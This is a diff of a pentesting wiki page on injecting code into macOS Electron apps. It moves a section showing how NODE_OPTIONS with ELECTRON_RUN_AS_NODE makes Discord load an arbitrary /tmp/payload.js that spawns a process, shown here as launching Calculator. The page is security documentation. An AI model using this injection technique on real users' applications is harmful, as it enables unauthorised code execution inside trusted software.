@@ -26,10 +26,28 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Note that now most Electron applications will ignore node parameters (such as --inspect) when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set.
+Note that now **hardened** Electron applications will **ignore node parameters** (such as --inspect) when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set.
 
 However, you could still use the electron param `--remote-debugging-port=9229` but the previous payload won't work to execute other processes.
 {% endhint %}
+
+## `NODE_OPTIONS`
+
+{% hint style="warning" %}
+This env variable would only work if the Electron application hasn't been properly hardened and is allowing it. If hardened, you would also need to use the **env variable `ELECTRON_RUN_AS_NODE`**.
+{% endhint %}
+
+With this combination you could store the payload in a different file and execute that file:
+
+{% code overflow="wrap" %}
+```bash
+# Content of /tmp/payload.js
+require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
+
+# Execute
+NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
+```
+{% endcode %}
 
 ## `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
@@ -69,20 +87,6 @@ As [**proposed here**](https://www.trustedsec.com/blog/macos-injection-via-third
 </dict>
 </plist>
 ```
-
-### `ELECTRON_RUN_AS_NODE` & `NODE_OPTIONS` &#x20;
-
-With this combination you could store the payload in a different file and execute that file:
-
-{% code overflow="wrap" %}
-```bash
-# Content of /tmp/payload.js
-require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
-
-# Execute
-NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
-```
-{% endcode %}
 
 <details>
 
